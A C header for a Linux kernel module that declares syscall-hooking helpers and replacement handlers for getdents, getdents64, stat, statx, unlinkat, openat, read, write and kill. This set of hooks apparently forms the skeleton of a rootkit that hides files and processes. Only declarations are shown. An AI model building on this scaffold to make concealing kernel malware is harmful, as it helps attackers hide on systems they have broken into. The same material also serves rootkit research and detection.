#pragma once
#include <linux/module.h>

typedef asmlinkage int64_t syscall_t(const struct pt_regs *);

bool hooks_install(void);
void hooks_uninstall(void);

void *hooks_orig_find(const char *symbol);
#define orig_get(o, n)                                                         \
  if (NULL == o) {                                                             \
    o = hooks_orig_find("__x64_sys_" n);                                       \
  }
int64_t hooks_orig_call(syscall_t *orig, const struct pt_regs *r);
#define orig_call(o) return (hooks_orig_call(o, r))

asmlinkage int64_t h_newfstatat(const struct pt_regs *r);
asmlinkage int64_t h_getdents64(const struct pt_regs *r);
asmlinkage int64_t h_getdents(const struct pt_regs *r);
asmlinkage int64_t h_unlinkat(const struct pt_regs *r);
asmlinkage int64_t h_openat(const struct pt_regs *r);
asmlinkage int64_t h_statx(const struct pt_regs *r);
asmlinkage int64_t h_chdir(const struct pt_regs *r);
asmlinkage int64_t h_write(const struct pt_regs *r);
asmlinkage int64_t h_read(const struct pt_regs *r);
asmlinkage int64_t h_open(const struct pt_regs *r);
asmlinkage int64_t h_kill(const struct pt_regs *r);
